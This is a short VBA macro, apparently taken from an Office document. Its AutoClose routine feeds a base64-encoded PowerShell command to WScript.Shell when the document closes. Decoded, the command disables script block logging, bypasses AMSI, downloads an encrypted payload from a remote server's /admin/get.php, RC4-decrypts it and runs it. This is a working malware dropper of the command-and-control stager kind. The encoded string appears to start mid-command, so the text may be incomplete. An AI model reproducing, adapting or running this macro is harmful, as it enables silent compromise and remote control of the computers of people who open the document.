Sub AutoClose()
        h
End Sub

Public Function h() As Variant
        oSR = oSR + "bwB3AHMAXABQAG8AdwBlAHIAUwBoAGUAbABsAFwAUwBjAHIAaQ"
        oSR = oSR + "BwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBd"
        oSR = oSR + "AD0AJABWAEEATAB9AEUAbABTAGUAewBbAFMAQwBSAEkAcABUAE"
        oSR = oSR + "IAbABvAGMAawBdAC4AIgBHAGUAdABGAGkAZQBgAEwARAAiACgA"
        oSR = oSR + "JwBzAGkAZwBuAGEAdAB1AHIAZQBzACcALAAnAE4AJwArACcAbw"
        oSR = oSR + "BuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApAC4AUwBl"
        oSR = oSR + "AHQAVgBhAGwAdQBlACgAJABOAFUATABMACwAKABOAGUAVwAtAE"
        oSR = oSR + "8AQgBqAEUAQwBUACAAQwBPAGwAbABFAGMAVABJAG8AbgBzAC4A"
        oSR = oSR + "RwBFAE4ARQBSAEkAYwAuAEgAYQBzAGgAUwBFAFQAWwBTAHQAUg"
        oSR = oSR + "BpAE4AZwBdACkAKQB9ACQAUgBFAGYAPQBbAFIARQBGAF0ALgBB"
        oSR = oSR + "AHMAcwBlAG0AYgBsAFkALgBHAEUAVABUAHkAcABFACgAJwBTAH"
        oSR = oSR + "kAcwB0AGUAbQAuAE0AYQBuAGEAZwBlAG0AZQBuAHQALgBBAHUA"
        oSR = oSR + "dABvAG0AYQB0AGkAbwBuAC4AQQBtAHMAaQAnACsAJwBVAHQAaQ"
        oSR = oSR + "BsAHMAJwApADsAJABSAEUAZgAuAEcAZQBUAEYAaQBlAEwAZAAo"
        oSR = oSR + "ACcAYQBtAHMAaQBJAG4AaQB0AEYAJwArACcAYQBpAGwAZQBkAC"
        oSR = oSR + "cALAAnAE4AbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMA"
        oSR = oSR + "JwApAC4AUwBFAFQAVgBhAGwAdQBFACgAJABuAFUATABMACwAJA"
        oSR = oSR + "B0AHIAdQBFACkAOwB9ADsAWwBTAFkAcwB0AEUAbQAuAE4AZQB0"
        oSR = oSR + "AC4AUwBlAHIAdgBpAGMAZQBQAE8AaQBuAFQATQBhAG4AYQBHAG"
        oSR = oSR + "UAUgBdADoAOgBFAFgAcABFAGMAVAAxADAAMABDAG8AbgB0AEkA"
        oSR = oSR + "bgB1AGUAPQAwADsAJAA0ADYARAA9AE4ARQB3AC0ATwBCAGoAZQ"
        oSR = oSR + "BDAFQAIABTAFkAcwBUAEUATQAuAE4ARQBUAC4AVwBFAEIAQwBs"
        oSR = oSR + "AEkAZQBOAHQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC"
        oSR = oSR + "4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsA"
        oSR = oSR + "IABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMA"
        oSR = oSR + "A7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBj"
        oSR = oSR + "AGsAbwAnADsAJABzAGUAcgA9ACQAKABbAFQARQB4AFQALgBFAG"
        oSR = oSR + "4AYwBvAEQASQBuAEcAXQA6ADoAVQBOAEkAYwBPAGQAZQAuAEcA"
        oSR = oSR + "RQB0AFMAdABSAGkATgBHACgAWwBDAE8ATgB2AGUAcgB0AF0AOg"
        oSR = oSR + "A6AEYAcgBPAE0AQgBhAFMARQA2ADQAUwBUAHIASQBOAEcAKAAn"
        oSR = oSR + "AGEAQQBCADAAQQBIAFEAQQBjAEEAQQA2AEEAQwA4AEEATAB3AE"
        oSR = oSR + "EAeABBAEQAawBBAE0AZwBBAHUAQQBEAEUAQQBOAGcAQQA0AEEA"
        oSR = oSR + "QwA0AEEATQBRAEEANABBAEMANABBAE4AQQBBADYAQQBEAGcAQQ"
        oSR = oSR + "BPAEEAQQA0AEEARABnAEEAJwApACkAKQA7ACQAdAA9ACcALwBh"
        oSR = oSR + "AGQAbQBpAG4ALwBnAGUAdAAuAHAAaABwACcAOwAkADQANgBEAC"
        oSR = oSR + "4ASABlAGEARABFAFIAUwAuAEEAZABkACgAJwBVAHMAZQByAC0A"
        oSR = oSR + "QQBnAGUAbgB0ACcALAAkAHUAKQA7ACQANAA2AGQALgBQAFIAbw"
        oSR = oSR + "B4AHkAPQBbAFMAeQBzAHQARQBNAC4ATgBlAFQALgBXAGUAYgBS"
        oSR = oSR + "AEUAcQBVAEUAUwBUAF0AOgA6AEQAZQBmAEEAVQBsAFQAVwBFAG"
        oSR = oSR + "IAUAByAE8AeAB5ADsAJAA0ADYAZAAuAFAAcgBvAFgAWQAuAEMA"
        oSR = oSR + "cgBlAGQARQBOAFQASQBBAGwAUwAgAD0AIABbAFMAWQBzAFQARQ"
        oSR = oSR + "BNAC4ATgBlAHQALgBDAHIARQBkAGUAbgBUAEkAQQBMAEMAQQBj"
        oSR = oSR + "AGgAZQBdADoAOgBEAGUAZgBhAHUAbAB0AE4AZQB0AFcAbwBSAG"
        oSR = oSR + "sAQwBSAGUARABlAE4AVABpAGEAbABTADsAJABTAGMAcgBpAHAA"
        oSR = oSR + "dAA6AFAAcgBvAHgAeQAgAD0AIAAkADQANgBkAC4AUAByAG8AeA"
        oSR = oSR + "B5ADsAJABLAD0AWwBTAHkAcwBUAEUAbQAuAFQAZQBYAFQALgBF"
        oSR = oSR + "AE4AYwBvAEQASQBOAGcAXQA6ADoAQQBTAEMASQBJAC4ARwBlAF"
        oSR = oSR + "QAQgBZAHQARQBTACgAJwA1AEwAYgAjAHoAMgBFAHMAMwBCAHEA"
        oSR = oSR + "LAApADAAUwBUAGgAQwA3AGcAPQBvAGMAJgBsACsAfQBGAH4AJQ"
        oSR = oSR + "A4AD8AJwApADsAJABSAD0AewAkAEQALAAkAEsAPQAkAEEAUgBn"
        oSR = oSR + "AHMAOwAkAFMAPQAwAC4ALgAyADUANQA7ADAALgAuADIANQA1AH"
        oSR = oSR + "wAJQB7ACQASgA9ACgAJABKACsAJABTAFsAJABfAF0AKwAkAEsA"
        oSR = oSR + "WwAkAF8AJQAkAEsALgBDAG8AVQBOAHQAXQApACUAMgA1ADYAOw"
        oSR = oSR + "AkAFMAWwAkAF8AXQAsACQAUwBbACQASgBdAD0AJABTAFsAJABK"
        oSR = oSR + "AF0ALAAkAFMAWwAkAF8AXQB9ADsAJABEAHwAJQB7ACQASQA9AC"
        oSR = oSR + "gAJABJACsAMQApACUAMgA1ADYAOwAkAEgAPQAoACQASAArACQA"
        oSR = oSR + "UwBbACQASQBdACkAJQAyADUANgA7ACQAUwBbACQASQBdACwAJA"
        oSR = oSR + "BTAFsAJABIAF0APQAkAFMAWwAkAEgAXQAsACQAUwBbACQASQBd"
        oSR = oSR + "ADsAJABfAC0AQgBYAG8AcgAkAFMAWwAoACQAUwBbACQASQBdAC"
        oSR = oSR + "sAJABTAFsAJABIAF0AKQAlADIANQA2AF0AfQB9ADsAJAA0ADYA"
        oSR = oSR + "RAAuAEgARQBhAGQAZQByAFMALgBBAEQARAAoACIAQwBvAG8Aaw"
        oSR = oSR + "BpAGUAIgAsACIARwBtAGkARgBXAGsAZABaAEMAdAA9AG8ATQBG"
        oSR = oSR + "AFAAVQA0AHUANgBsAGUAbABsAEkATwBBAE8AbwB5AGsAbAAyAG"
        oSR = oSR + "MAUgBmAFkAZwBBAD0AIgApADsAJABkAGEAdABhAD0AJAA0ADYA"
        oSR = oSR + "RAAuAEQAbwBXAG4AbABvAEEARABEAGEAdABhACgAJABzAGUAcg"
        oSR = oSR + "ArACQAVAApADsAJABpAHYAPQAkAEQAYQBUAEEAWwAwAC4ALgAz"
        oSR = oSR + "AF0AOwAkAGQAYQBUAGEAPQAkAGQAYQBUAEEAWwA0AC4ALgAkAE"
        oSR = oSR + "QAQQB0AEEALgBsAGUAbgBHAFQASABdADsALQBKAG8AaQBOAFsA"
        oSR = oSR + "QwBoAEEAUgBbAF0AXQAoACYAIAAkAFIAIAAkAGQAQQBUAGEAIA"
        oSR = oSR + "AoACQASQBWACsAJABLACkAKQB8AEkARQBYAA=="
        Set asd = CreateObject("WScript.Shell")
        asd.Run(oSR)
End Function

